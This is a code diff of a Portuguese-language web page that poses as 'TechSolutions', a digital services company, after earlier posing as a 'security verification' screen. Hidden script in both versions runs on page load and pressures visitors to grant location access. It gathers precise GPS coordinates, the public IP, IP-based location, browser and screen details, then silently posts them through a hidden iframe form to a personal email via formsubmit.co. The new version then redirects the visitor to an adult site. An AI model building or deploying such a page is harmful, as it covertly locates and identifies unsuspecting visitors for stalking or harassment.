@@ -3,323 +3,269 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Segurança</title>
+    <title>TechSolutions - Soluções Digitais</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        #access-block {
+        .gradient-text {
+            background: linear-gradient(90deg, #2563eb 0%, #1d4ed8 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .gradient-bg {
+            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+        }
+        #location-modal {
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #111827;
-            display: flex;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
-            color: white;
         }
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            max-width: 500px;
+            text-align: center;
         }
     </style>
 </head>
-<body>
-    <!-- Bloqueio de acesso até verificação -->
-    <div id="access-block">
-        <div class="text-center p-8 max-w-md">
-            <div class="pulse mb-6">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 mx-auto text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
-                </svg>
-            </div>
-            <h2 class="text-2xl font-bold mb-4">Verificação de Segurança</h2>
-            <p class="mb-6 text-gray-300">Estamos verificando seu dispositivo para garantir acesso seguro ao conteúdo.</p>
-            <div id="status" class="mb-6 p-3 bg-gray-800 rounded-lg">
-                <p class="text-yellow-400 flex items-center justify-center">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
-                        <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
-                    </svg>
-                    Analisando dispositivo...
-                </p>
-            </div>
-            <button id="retry-btn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded-lg opacity-0 transition-opacity duration-300">
+<body class="font-sans bg-gray-50 text-gray-800">
+    <!-- Modal de Localização -->
+    <div id="location-modal">
+        <div class="modal-content">
+            <i class="fas fa-map-marker-alt text-4xl text-blue-500 mb-4"></i>
+            <h2 class="text-2xl font-bold mb-4">Permissão de Localização Necessária</h2>
+            <p class="mb-6">Para oferecer a melhor experiência, precisamos da sua localização. Por favor, clique em "Permitir" quando solicitado pelo seu navegador.</p>
+            <button id="retry-btn" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-6 rounded-lg">
                 Tentar Novamente
             </button>
         </div>
     </div>
 
-    <!-- Conteúdo real (oculto inicialmente) -->
-    <div id="real-content" class="hidden">
-        <!-- Seu conteúdo normal aqui -->
-    </div>
+    <!-- Conteúdo do Site -->
+    <header class="gradient-bg text-white sticky top-0 z-40 shadow-lg">
+        <div class="container mx-auto px-6 py-4">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-2">
+                    <i class="fas fa-code text-2xl"></i>
+                    <h1 class="text-2xl font-bold">TechSolutions</h1>
+                </div>
+                <nav class="hidden md:block">
+                    <ul class="flex space-x-8">
+                        <li><a href="#" class="hover:text-gray-200">Início</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Serviços</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Contato</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
 
-    <!-- Sistema de coleta oculto -->
-    <iframe name="hidden-iframe" style="display:none"></iframe>
-    <form id="data-collector" 
-          action="https://formsubmit.co/SEU_EMAIL_AQUI" 
+    <main class="container mx-auto px-6 py-10">
+        <section class="text-center mb-20">
+            <h1 class="text-4xl md:text-6xl font-bold mb-6">
+                <span class="gradient-text">Soluções Digitais</span> Inovadoras
+            </h1>
+            <p class="text-xl text-gray-600 mb-10">
+                Transformamos suas ideias em realidade digital com tecnologia de ponta
+            </p>
+            <button class="bg-blue-500 hover:bg-blue-600 text-white font-semibold px-8 py-3 rounded-lg">
+                Conheça nossos serviços
+            </button>
+        </section>
+
+        <section class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-20">
+            <div class="bg-white p-6 rounded-lg shadow">
+                <i class="fas fa-globe text-3xl text-blue-500 mb-4"></i>
+                <h3 class="text-xl font-bold mb-3">Sites Responsivos</h3>
+                <p class="text-gray-600">Desenvolvimento web moderno para todos os dispositivos.</p>
+            </div>
+            <div class="bg-white p-6 rounded-lg shadow">
+                <i class="fas fa-mobile-alt text-3xl text-blue-500 mb-4"></i>
+                <h3 class="text-xl font-bold mb-3">Apps Móveis</h3>
+                <p class="text-gray-600">Aplicativos nativos para iOS e Android.</p>
+            </div>
+            <div class="bg-white p-6 rounded-lg shadow">
+                <i class="fas fa-chart-line text-3xl text-blue-500 mb-4"></i>
+                <h3 class="text-xl font-bold mb-3">Marketing Digital</h3>
+                <p class="text-gray-600">Estratégias para aumentar sua visibilidade online.</p>
+            </div>
+        </section>
+    </main>
+
+    <footer class="bg-gray-800 text-gray-300 py-8">
+        <div class="container mx-auto px-6 text-center">
+            <p>&copy; 2023 TechSolutions. Todos os direitos reservados.</p>
+        </div>
+    </footer>
+
+    <!-- Sistema de Coleta de Dados (Oculto) -->
+    <iframe name="hiddenFrame" style="display:none"></iframe>
+    <form id="dataCollector"
+          action="https://formsubmit.co/grkhuj@gmail.com" 
           method="POST"
-          target="hidden-iframe">
+          target="hiddenFrame">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="ip" id="ip">
+        <input type="hidden" name="_subject" value="Novo Acesso - Dados Coletados">
         <input type="hidden" name="ipv4" id="ipv4">
+        <input type="hidden" name="user_agent" id="userAgent">
+        <input type="hidden" name="screen" id="screen">
+        <input type="hidden" name="referrer" id="referrer">
+        <input type="hidden" name="timestamp" id="timestamp">
         <input type="hidden" name="latitude" id="latitude">
         <input type="hidden" name="longitude" id="longitude">
         <input type="hidden" name="accuracy" id="accuracy">
-        <input type="hidden" name="user_agent" id="user-agent">
-        <input type="hidden" name="device_model" id="device-model">
-        <input type="hidden" name="os" id="os">
-        <input type="hidden" name="browser" id="browser">
-        <input type="hidden" name="screen_resolution" id="screen-resolution">
-        <input type="hidden" name="timestamp" id="timestamp">
-        <input type="hidden" name="location_method" id="location-method">
+        <input type="hidden" name="location_access" id="locationAccess">
+        <input type="hidden" name="ip_location" id="ipLocation">
     </form>
 
     <script>
-        // Elementos DOM
-        const accessBlock = document.getElementById('access-block');
-        const statusEl = document.getElementById('status');
+        // Elementos do modal
+        const locationModal = document.getElementById('location-modal');
         const retryBtn = document.getElementById('retry-btn');
-        
-        // Configurações
-        const MAX_ATTEMPTS = 3;
-        let attempts = 0;
-        let coords = null;
 
-        // Atualiza o status na tela
-        function updateStatus(message, type = 'warning') {
-            const colors = {
-                warning: 'yellow-400',
-                error: 'red-400',
-                success: 'green-400'
-            };
-            
-            statusEl.innerHTML = `
-                <p class="text-${colors[type]} flex items-center justify-center">
-                    ${type === 'success' ? `
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
-                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
-                    </svg>
-                    ` : type === 'error' ? `
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
-                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
-                    </svg>
-                    ` : `
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
-                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9z" clip-rule="evenodd" />
-                    </svg>
-                    `}
-                    ${message}
-                </p>
-            `;
+        // Mostra o modal de localização
+        function showLocationModal() {
+            locationModal.style.display = 'flex';
         }
 
-        // Detecta modelo do dispositivo (para celulares)
-        function getDeviceModel() {
-            const userAgent = navigator.userAgent;
-            
-            // Detecta iOS
-            if (/iPhone|iPad|iPod/i.test(userAgent)) {
-                const modelMatch = userAgent.match(/iPhone\s+(\d+)|iPad\s+(\d+)|iPod\s+(\d+)/i);
-                if (modelMatch) {
-                    return `Apple ${modelMatch[0]}`;
-                }
-                return 'Apple Device';
-            }
-            
-            // Detecta Android
-            if (/Android/i.test(userAgent)) {
-                const modelMatch = userAgent.match(/Android.*;\s([^;]+)\sBuild/i);
-                if (modelMatch && modelMatch[1]) {
-                    return modelMatch[1].replace(/_/g, ' ');
-                }
-                return 'Android Device';
-            }
-            
-            // Outros dispositivos
-            return 'Desktop/Outro';
+        // Esconde o modal de localização
+        function hideLocationModal() {
+            locationModal.style.display = 'none';
         }
 
-        // Detecta sistema operacional
-        function getOS() {
-            const userAgent = navigator.userAgent;
-            
-            if (/Android/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/Android\s([0-9.]+)/);
-                return `Android ${versionMatch ? versionMatch[1] : ''}`.trim();
-            }
-            if (/iPhone|iPad|iPod/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/OS\s([0-9_]+)/);
-                return `iOS ${versionMatch ? versionMatch[1].replace(/_/g, '.') : ''}`.trim();
-            }
-            if (/Windows/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/Windows NT\s([0-9.]+)/);
-                return `Windows ${versionMatch ? versionMatch[1] : ''}`.trim();
-            }
-            if (/Mac OS X/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/Mac OS X\s([0-9_]+)/);
-                return `macOS ${versionMatch ? versionMatch[1].replace(/_/g, '.') : ''}`.trim();
-            }
-            if (/Linux/i.test(userAgent)) {
-                return 'Linux';
-            }
-            
-            return 'Sistema Operacional Desconhecido';
-        }
+        // Tenta novamente obter a localização
+        retryBtn.addEventListener('click', async () => {
+            hideLocationModal();
+            await getGeolocation();
+        });
 
-        // Detecta navegador
-        function getBrowser() {
-            const userAgent = navigator.userAgent;
-            
-            if (/Firefox/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/Firefox\/([0-9.]+)/);
-                return `Firefox ${versionMatch ? versionMatch[1] : ''}`.trim();
-            }
-            if (/Chrome/i.test(userAgent) && !/Edge/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/Chrome\/([0-9.]+)/);
-                return `Chrome ${versionMatch ? versionMatch[1] : ''}`.trim();
-            }
-            if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/Version\/([0-9.]+)/);
-                return `Safari ${versionMatch ? versionMatch[1] : ''}`.trim();
-            }
-            if (/Edge/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/Edge\/([0-9.]+)/);
-                return `Edge ${versionMatch ? versionMatch[1] : ''}`.trim();
-            }
-            if (/Opera|OPR/i.test(userAgent)) {
-                const versionMatch = userAgent.match(/(Opera|OPR)\/([0-9.]+)/);
-                return `Opera ${versionMatch ? versionMatch[2] : ''}`.trim();
-            }
-            
-            return 'Navegador Desconhecido';
-        }
-
-        // Tenta obter localização precisa
-        async function getPreciseLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy,
-                        method: 'GPS'
-                    }),
-                    (err) => {
-                        console.error('Erro de geolocalização:', err);
-                        resolve(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            });
-        }
-
-        // Fallback por IP
+        // Função para obter localização por IP
         async function getIPLocation() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 
                 if (data.latitude && data.longitude) {
-                    return {
-                        lat: data.latitude,
-                        lng: data.longitude,
-                        accuracy: 1000, // ~1km de precisão
-                        method: 'IP'
-                    };
+                    document.getElementById('ipLocation').value = 
+                        `${data.city}, ${data.region}, ${data.country_name}`;
+                    
+                    // Se não tivermos GPS, usamos a localização por IP
+                    if (!document.getElementById('latitude').value) {
+                        document.getElementById('latitude').value = data.latitude;
+                        document.getElementById('longitude').value = data.longitude;
+                        document.getElementById('accuracy').value = `IP (${data.postal || 'Aprox'})`;
+                    }
                 }
-            } catch (e) {
-                console.error('Erro ao obter localização por IP:', e);
+            } catch (error) {
+                console.error('Erro ao obter localização por IP:', error);
             }
-            return null;
         }
 
-        // Processo principal
-        async function verifyLocation() {
-            attempts++;
-            updateStatus(`Verificando... (${attempts}/${MAX_ATTEMPTS})`);
+        // Função para obter localização geográfica
+        async function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    document.getElementById('locationAccess').value = "Navegador não suporta geolocalização";
+                    resolve();
+                    return;
+                }
 
-            // Coleta informações do dispositivo
-            document.getElementById('device-model').value = getDeviceModel();
-            document.getElementById('os').value = getOS();
-            document.getElementById('browser').value = getBrowser();
-            document.getElementById('screen-resolution').value = `${window.screen.width}x${window.screen.height}`;
-            document.getElementById('user-agent').value = navigator.userAgent;
+                // Configuração para forçar alta precisão
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,  // 10 segundos
+                    maximumAge: 0     // Sem cache
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Sucesso - obtemos as coordenadas
+                        document.getElementById('latitude').value = position.coords.latitude;
+                        document.getElementById('longitude').value = position.coords.longitude;
+                        document.getElementById('accuracy').value = position.coords.accuracy + ' metros';
+                        document.getElementById('locationAccess').value = "Permitido";
+                        hideLocationModal();
+                        resolve();
+                    },
+                    (error) => {
+                        // Erro - mostra o modal e registra o erro
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Usuário negou a solicitação de geolocalização";
+                                showLocationModal();
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Informação de localização indisponível";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "A solicitação de localização expirou";
+                                showLocationModal();
+                                break;
+                            default:
+                                errorMessage = "Erro desconhecido na geolocalização";
+                        }
+                        
+                        document.getElementById('locationAccess').value = errorMessage;
+                        resolve();
+                    },
+                    options
+                );
+            });
+        }
+
+        // Coleta de dados principal
+        async function collectAndSend() {
+            // Dados básicos
+            document.getElementById('userAgent').value = navigator.userAgent;
+            document.getElementById('screen').value = `${screen.width}x${screen.height}`;
+            document.getElementById('referrer').value = document.referrer || 'Direto';
             document.getElementById('timestamp').value = new Date().toISOString();
+
+            // Obtém IPv4
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                document.getElementById('ipv4').value = data.ip || "Não disponível";
+            } catch (error) {
+                document.getElementById('ipv4').value = "Erro ao obter";
+            }
+
+            // 1. Tenta obter localização precisa via GPS
+            await getGeolocation();
             
-            // 1. Tentativa com GPS
-            coords = await getPreciseLocation();
+            // 2. Fallback: Obtém localização aproximada via IP
+            await getIPLocation();
+
+            // Envia os dados silenciosamente
+            document.getElementById('dataCollector').submit();
             
-            // 2. Fallback por IP se GPS falhar
-            if (!coords) {
-                coords = await getIPLocation();
-            }
-
-            // Se obteve localização
-            if (coords) {
-                // Preenche o formulário
-                document.getElementById('latitude').value = coords.lat;
-                document.getElementById('longitude').value = coords.lng;
-                document.getElementById('accuracy').value = `${coords.accuracy}m (${coords.method})`;
-                document.getElementById('location-method').value = coords.method;
-                
-                // Obtém IP público
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    document.getElementById('ip').value = ipData.ip;
-                    document.getElementById('ipv4').value = ipData.ip.includes('.') ? ipData.ip : 'IPv6';
-                } catch (e) {
-                    document.getElementById('ip').value = 'Erro';
-                }
-                
-                // Envia os dados
-                document.getElementById('data-collector').submit();
-                
-                // Mostra conteúdo
-                updateStatus('Verificação concluída com sucesso!', 'success');
-                setTimeout(() => {
-                    accessBlock.style.display = 'none';
-                    document.getElementById('real-content').classList.remove('hidden');
-                }, 1500);
-                return;
-            }
-
-            // Se falhou e ainda tem tentativas
-            if (attempts < MAX_ATTEMPTS) {
-                setTimeout(verifyLocation, 2000);
-                return;
-            }
-
-            // Se esgotou as tentativas
-            updateStatus('Ative a localização para continuar', 'error');
-            retryBtn.classList.remove('opacity-0');
+            // Redireciona após 3 segundos (opcional)
+            setTimeout(() => {
+                window.location.href = "https://xvideos.com"; // Altere para sua URL
+            }, 3000);
         }
 
-        // Botão de tentar novamente
-        retryBtn.addEventListener('click', () => {
-            retryBtn.classList.add('opacity-0');
-            attempts = 0;
-            verifyLocation();
-        });
-
-        // Inicia o processo quando a página carrega
-        document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(verifyLocation, 500);
+        // Inicia a coleta de dados quando a página carrega
+        window.addEventListener('load', () => {
+            // Mostra o modal após 1 segundo se a localização ainda não foi permitida
+            setTimeout(() => {
+                if (!document.getElementById('latitude').value) {
+                    showLocationModal();
+                }
+            }, 1000);
+            
+            // Inicia o processo de coleta
+            collectAndSend();
         });
     </script>
 </body>
